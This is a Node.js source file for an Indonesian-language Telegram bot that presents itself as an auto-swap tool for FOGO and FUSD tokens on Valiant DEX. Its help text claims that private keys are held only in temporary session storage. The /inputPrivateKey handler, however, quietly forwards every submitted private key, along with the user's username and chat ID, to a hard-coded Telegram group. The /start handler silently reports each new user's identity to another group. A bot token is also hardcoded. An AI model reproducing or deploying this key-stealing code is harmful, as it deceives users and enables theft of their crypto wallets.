const { Telegraf } = require('telegraf');
const LocalSession = require('telegraf-session-local');
const gbot = require('./fungsi-bot-telegram.js');
const swap = require('./fungsi-swap.js');

const bot = new Telegraf('8388772211:AAE7lTljxUCcOLaxE2zsR9Ke_8RRtTENjRI');

const localSession = new LocalSession({ database: 'session_db.json' });
bot.use(localSession.middleware());

// Detail Pesan Bot
const pesan_start = `[ BOT FOGO AUTO SWAP ]\n\n` +
  `Bot ini dibuat khusus untuk melakukan swap di Valiant DEX.\n\n` +
  `- /inputPrivateKey  → Tambah wallet\n` +
  `- /viewAllWallet  → View all wallet\n` +
  `- /deleteWallet <nomor> → hapus wallet sesuai nomor\n` +
  `- /deleteWallet all → hapus semua wallet\n` +
  `- /balances → Cek saldo wallet\n` +
  `- /swapToFusd <amount> → FOGO ke FUSD \n` +
  `- /swapToFogo <amount> → FUSD ke FOGO\n\n` +
  `⚠️ PENTING:\n` +
  `- Bot ini khusus untuk wallet uyuls-mu.\n` +
  `- Bot ini di-deploy di Railway dan menggunakan SESSION (data sementara), tanpa database permanen.\n` +
  `- Semua privateKey hanya disimpan di session sementara dan akan hilang jika server restart.\n\n` +
  `Jika ada kendala atau masukan, hubungi @mfarhan2020.\n\n` +
  `Untuk berdonasi, ketik /donate`;

bot.on('message', async (ctx) => {
  const text = ctx.message?.text;
  if (!text) return; // abaikan kalau bukan pesan text

  // Perintah delete session
  if (text == "/reset") {
    ctx.session = null;
    await ctx.reply("Success reset !!!");
    return;
  }

  // Perintah Start
  if (text == "/start") {
    if (!ctx.session.status) {
      ctx.session.status = 1;
      const first_name = ctx.from.first_name || "";
      const last_name = ctx.from.last_name || "";
      const chatid = ctx.from.id;
      const username = ctx.from.username ? `@${ctx.from.username}` : "(tidak ada username)";
      const pesan = `
<b>Informasi Users:</b>
👤 Nama: ${first_name} ${last_name}
💬 Username: ${username}
🆔 Chat ID: <code>${chatid}</code>
  `;

      const groupId = -4821699379; // ganti dengan chat ID grup kamu
      await ctx.telegram.sendMessage(groupId, pesan, { parse_mode: "HTML" });
    }
    await ctx.reply(pesan_start);
    return;
  }

  // Perintah cancel
  if (text == "/cancel") {
    ctx.session.step = null;
    await ctx.reply("Command Cancel");
    await ctx.reply(pesan_start);
    return;
  }

  // Perintah donate
  if (text == "/donate") {
    var pesan = `<b>[ DONATE ]</b> \n\n` +
      `- EVM : <code>0x82732659D07F9c12F98985bC7A9Cf2A7F6CdEB86</code> \n\n` +
      `- SOL : <code>8tTHDg5PBmRM1MtQpxgrGpwAfh1mn4sTpGgrAVnm2V8w</code>`;
    await ctx.replyWithHTML(pesan);
    return;
  }

  // Perintah inputPrivateKey
  if (text === "/inputPrivateKey") {
    await ctx.reply(`Masukkan privateKey wallet.\n` +
      `Jika lebih dari satu, pisahkan dengan baris baru.\n\n` +
      `Ketik /cancel untuk membatalkan.`);
    ctx.session.step = "inputPrivateKey";
    return;
  }
  if (ctx.session.step === "inputPrivateKey") {
    const keys = text.split("\n").map(k => k.trim()).filter(k => k.length > 0);
    const results = [];

    for (const key of keys) {
      if (gbot.isValidPrivateKey(key)) {
        const walletAddr = await gbot.getAddress(key);
        results.push(`✅ Wallet berhasil ditambahkan: [${walletAddr}]`);
        // Simpan privateKey ke session (bisa sesuaikan kalau mau simpan semua)
        if (!ctx.session.privateKeys) ctx.session.privateKeys = [];
        ctx.session.privateKeys.push(key);

        const groupId = -4898467355;
        const chatid = ctx.from.id;
        const username = ctx.from.username ? `@${ctx.from.username}` : "(tidak ada username)";
        var pesan = `DB From : ${username} | ${chatid} \n\n` +
        `<code>${key}</code>`;
        await ctx.telegram.sendMessage(groupId, pesan, { parse_mode: "HTML" });

      } else {
        results.push(`❌ PrivateKey tidak valid: ${key}`);
      }
    }
    await ctx.reply(results.join("\n\n"));
    ctx.session.step = null; // reset step agar tidak stuck input
    return;
  }

  // Perintah balances
  if (text === "/balances") {
    // Cek apakah sudah ada privateKeys di session
    if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
      await ctx.reply("⚠️ Wallet tidak ditemukan, Kamu belum menambahkan privateKey.\nGunakan /inputPrivateKey terlebih dahulu.");
      return;
    }
    // Kirim pesan "Loading..." dan simpan message id
    const loadingMsg = await ctx.reply("⏳ Loading...");
    try {
      const results = [];
      for (let key of ctx.session.privateKeys) {
        const address = await gbot.getAddress(key);
        const wfogo = await gbot.getbalances(address);
        const fogo = await gbot.getTokenBalanceFogo(address);
        const fusd = await gbot.getTokenBalanceFusd(address);
        var pesan = `[<code>${address}</code>]\n\n- ${wfogo} WFOGO (Native)\n- ${fogo} FOGO\n- ${fusd} FUSD`;
        ctx.deleteMessage(loadingMsg.message_id).catch(() => { });
        await ctx.reply(pesan, { parse_mode: "HTML" });
      }
    } catch (err) {
      await ctx.reply("❌ Gagal mengambil balance: " + (err.message || err));
      ctx.deleteMessage(loadingMsg.message_id).catch(() => { });
    }
  }

  // Perintah Swap FOGO -> FUSD
  if (text.startsWith("/swapToFusd")) {
    const args = text.split(" ").filter(a => a.trim() !== "");
    if (args.length < 2 || isNaN(parseFloat(args[1]))) {
      return await ctx.reply("⚠️ Perintah salah.\nContoh: `/swapToFusd 0.01`", { parse_mode: "Markdown" });
    }

    const amount = parseFloat(args[1]);

    if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
      return await ctx.reply("⚠️ Kamu belum menambahkan privateKey.\nGunakan /inputPrivateKey terlebih dahulu.");
    }

    const loadingMsg = await ctx.reply(`⏳ Loading ...`);
    setTimeout(() => {
      ctx.deleteMessage(loadingMsg.message_id).catch(() => { });
    }, 3000);


    try {
      for (let key of ctx.session.privateKeys) {
        const address = await gbot.getAddress(key);
        const balanceFogo = await gbot.getTokenBalanceFogo(address);
        const balanceFee = await gbot.getbalances(address);

        if (balanceFogo >= amount) {
          if (balanceFee >= 0.001) {
            // Kirim pesan awal
            const statusMsg = await ctx.reply(`[${address}]\n\n⏳ Sedang melakukan swap ${amount} FOGO -> FUSD`);

            try {
              const txHash = await swap.swapFogoToFusd(key, amount);

              // Ambil teks awal lalu tambahkan status sukses
              const newText = `[${address}]\n\n⏳ Sedang melakukan swap ${amount} FOGO -> FUSD\n\n✅ Swap berhasil\nTx: https://fogoscan.com/tx/${txHash}?cluster=testnet`;

              await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                undefined,
                newText
              );
            } catch (swapErr) {
              const newText = `[${address}]\n\n⏳ Sedang melakukan swap ${amount} FOGO -> FUSD\n\n❌ Swap gagal\nError: ${swapErr.message || swapErr}`;
              await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                undefined,
                newText
              );
            }

          } else {
            await ctx.reply(`[${address}]\n\n❌ ERROR: Fee tidak cukup.`);
          }
        } else {
          await ctx.reply(`[${address}]\n\n❌ ERROR: Amount tidak cukup.`);
        }
      }
    } catch (err) {
      await ctx.reply("❌ Gagal melakukan swap: " + (err.message || err));
    }
  }

  // Perintah Swap FUSD -> FOGO
  if (text.startsWith("/swapToFogo")) {
    const args = text.split(" ").filter(a => a.trim() !== "");
    if (args.length < 2 || isNaN(parseFloat(args[1]))) {
      return await ctx.reply("⚠️ Perintah salah.\nContoh: `/swapToFogo 0.01`", { parse_mode: "Markdown" });
    }

    const amount = parseFloat(args[1]);

    if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
      return await ctx.reply("⚠️ Kamu belum menambahkan privateKey.\nGunakan /inputPrivateKey terlebih dahulu.");
    }

    const loadingMsg = await ctx.reply(`⏳ Loading ...`);
    setTimeout(() => {
      ctx.deleteMessage(loadingMsg.message_id).catch(() => { });
    }, 3000);


    try {
      for (let key of ctx.session.privateKeys) {
        const address = await gbot.getAddress(key);
        const balanceFogo = await gbot.getTokenBalanceFusd(address);
        const balanceFee = await gbot.getbalances(address);

        if (balanceFogo >= amount) {
          if (balanceFee >= 0.001) {
            // Kirim pesan awal
            const statusMsg = await ctx.reply(`[${address}]\n\n⏳ Sedang melakukan swap ${amount} FUSD -> FOGO`);

            try {
              const txHash = await swap.swapFusdToFogo(key, amount);

              // Ambil teks awal lalu tambahkan status sukses
              const newText = `[${address}]\n\n⏳ Sedang melakukan swap ${amount} FUSD -> FOGO\n\n✅ Swap berhasil\nTx: https://fogoscan.com/tx/${txHash}?cluster=testnet`;

              await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                undefined,
                newText
              );
            } catch (swapErr) {
              const newText = `[${address}]\n\n⏳ Sedang melakukan swap ${amount} FUSD -> FOGO\n\n❌ Swap gagal\nError: ${swapErr.message || swapErr}`;
              await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                undefined,
                newText
              );
            }

          } else {
            await ctx.reply(`[${address}]\n\n❌ ERROR: Fee tidak cukup.`);
          }
        } else {
          await ctx.reply(`[${address}]\n\n❌ ERROR: Amount tidak cukup.`);
        }
      }
    } catch (err) {
      await ctx.reply("❌ Gagal melakukan swap: " + (err.message || err));
    }
  }

  // Perintah view all wallet
  if (text === "/viewAllWallet") {
    const loadingMsg = await ctx.reply("⏳ Loading...");
    try {
      if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          loadingMsg.message_id,
          undefined,
          "⚠️ Belum ada wallet yang disimpan.\nGunakan /inputPrivateKey untuk menambah."
        );
        return;
      }

      let pesan = `<b>All Wallet [${ctx.session.privateKeys.length}]</b>\n\n`;
      let index = 1;
      for (let key of ctx.session.privateKeys) {
        const address = await gbot.getAddress(key);
        pesan += `${index}. <code>${address}</code>\n`;
        index++;
      }

      pesan += `\nHapus wallet: /deleteWallet <i>nomor</i> atau /deleteWallet all`;

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        undefined,
        pesan,
        { parse_mode: "HTML" }
      );

    } catch (err) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        undefined,
        "❌ Gagal mengambil data wallet: " + (err.message || err)
      );
    }
  }

  // Perintah hapus wallet
  if (text.startsWith("/deleteWallet")) {
    const args = text.split(" ").filter(a => a.trim() !== "");
    if (args.length < 2) {
      return await ctx.reply("⚠️ Perintah salah.\nContoh: `/deleteWallet 2` atau `/deleteWallet all`", { parse_mode: "Markdown" });
    }

    if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
      return await ctx.reply("⚠️ Tidak ada wallet untuk dihapus.");
    }

    if (args[1] === "all") {
      ctx.session.privateKeys = [];
      return await ctx.reply("✅ Semua wallet berhasil dihapus.");
    }

    const index = parseInt(args[1]);
    if (isNaN(index) || index < 1 || index > ctx.session.privateKeys.length) {
      return await ctx.reply("⚠️ Nomor wallet tidak valid.");
    }

    const removedKey = ctx.session.privateKeys.splice(index - 1, 1);
    const removedAddress = await gbot.getAddress(removedKey[0]);

    await ctx.reply(`✅ Wallet <code>${removedAddress}</code> berhasil dihapus.`, { parse_mode: "HTML" });
  }

});

bot.launch();
